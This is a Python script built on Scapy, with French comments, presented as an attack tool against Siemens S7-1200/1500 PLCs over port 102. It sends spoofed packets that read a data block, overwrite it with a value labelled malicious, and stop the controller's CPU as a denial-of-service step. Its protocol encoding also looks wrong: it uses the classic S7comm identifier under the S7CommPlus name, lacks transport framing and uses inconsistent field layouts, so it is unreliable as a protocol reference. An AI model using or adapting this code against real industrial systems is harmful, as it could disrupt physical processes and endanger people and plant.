from scapy.all import *
import struct
import time

# Configuration réseau
ip_master = "192.168.1.100"  # HMI/SCADA
ip_plc = "192.168.1.10"      # PLC Siemens S7-1200/1500
sport = 102                   # Port S7CommPlus standard
dport = 102
seq_num = 100000
ack_num = 200000

# S7CommPlus - Write Request (Job)
def create_s7commplus_write_request():
    # En-tête S7CommPlus
    protocol_id = 0x32        # S7CommPlus
    job_type = 0x01           # Job
    function_group = 0x04     # Programming
    function_code = 0x05      # Write
    sequence_number = 0x0001
    parameter_length = 0x0008
    data_length = 0x0004
    
    # Paramètres
    transport_size = 0x02     # BYTE
    length = 0x0001           # 1 byte
    db_number = 0x0001        # DB1
    area = 0x84              # DB area
    address = 0x000000        # Offset 0
    
    # Données à écrire
    data_value = 0x55         # Valeur malveillante
    
    # Construction du payload
    payload = struct.pack(">BBBBHHHBBHHBB",
        protocol_id,
        job_type,
        function_group,
        function_code,
        sequence_number,
        parameter_length,
        data_length,
        transport_size,
        length,
        db_number,
        area,
        address >> 16,
        address & 0xFFFF
    ) + struct.pack(">B", data_value)
    
    return payload

# S7CommPlus - Read Request (Job)
def create_s7commplus_read_request():
    protocol_id = 0x32
    job_type = 0x01
    function_group = 0x04
    function_code = 0x04      # Read
    sequence_number = 0x0002
    parameter_length = 0x0008
    data_length = 0x0000
    
    # Paramètres de lecture
    transport_size = 0x02
    length = 0x0001
    db_number = 0x0001
    area = 0x84
    address = 0x000000
    
    payload = struct.pack(">BBBBHHHBBHHBB",
        protocol_id,
        job_type,
        function_group,
        function_code,
        sequence_number,
        parameter_length,
        data_length,
        transport_size,
        length,
        db_number,
        area,
        address >> 16,
        address & 0xFFFF
    )
    
    return payload

# S7CommPlus - Stop CPU (Attaque critique)
def create_s7commplus_stop_cpu():
    protocol_id = 0x32
    job_type = 0x01
    function_group = 0x04
    function_code = 0x29      # Stop CPU
    sequence_number = 0x0003
    parameter_length = 0x0000
    data_length = 0x0000
    
    payload = struct.pack(">BBBBHHH",
        protocol_id,
        job_type,
        function_group,
        function_code,
        sequence_number,
        parameter_length,
        data_length
    )
    
    return payload

# Fonction d'attaque MITM
def s7commplus_mitm_attack():
    print("[+] Démarrage de l'attaque S7CommPlus MITM...")
    
    # 1. Lecture des données sensibles
    print("[+] Phase 1: Lecture des données critiques...")
    read_payload = create_s7commplus_read_request()
    ip = IP(src=ip_master, dst=ip_plc)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    read_packet = ip / tcp / Raw(load=read_payload)
    send(read_packet, verbose=1)
    
    time.sleep(1)
    
    # 2. Modification malveillante des données
    print("[+] Phase 2: Injection de données malveillantes...")
    write_payload = create_s7commplus_write_request()
    tcp.seq += len(read_payload)
    tcp.ack += 1
    write_packet = ip / tcp / Raw(load=write_payload)
    send(write_packet, verbose=1)
    
    time.sleep(1)
    
    # 3. Attaque de déni de service (optionnel)
    print("[+] Phase 3: Attaque DoS - Arrêt du CPU...")
    stop_payload = create_s7commplus_stop_cpu()
    tcp.seq += len(write_payload)
    tcp.ack += 1
    stop_packet = ip / tcp / Raw(load=stop_payload)
    send(stop_packet, verbose=1)
    
    print("[+] Attaque S7CommPlus terminée!")

# Fonction de reconnaissance
def s7commplus_reconnaissance():
    print("[+] Reconnaissance S7CommPlus...")
    
    # Tentative de connexion et identification
    connect_payload = struct.pack(">BBBBHHH", 0x32, 0x01, 0x04, 0x01, 0x0001, 0x0000, 0x0000)
    
    ip = IP(src=ip_master, dst=ip_plc)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    packet = ip / tcp / Raw(load=connect_payload)
    
    send(packet, verbose=1)
    print("[+] Paquet de reconnaissance envoyé")

if __name__ == "__main__":
    print("=== S7CommPlus MITM Attack Tool ===")
    print("1. Reconnaissance")
    print("2. Attaque complète")
    
    choice = input("Choix (1/2): ")
    
    if choice == "1":
        s7commplus_reconnaissance()
    elif choice == "2":
        s7commplus_mitm_attack()
    else:
        print("Choix invalide")
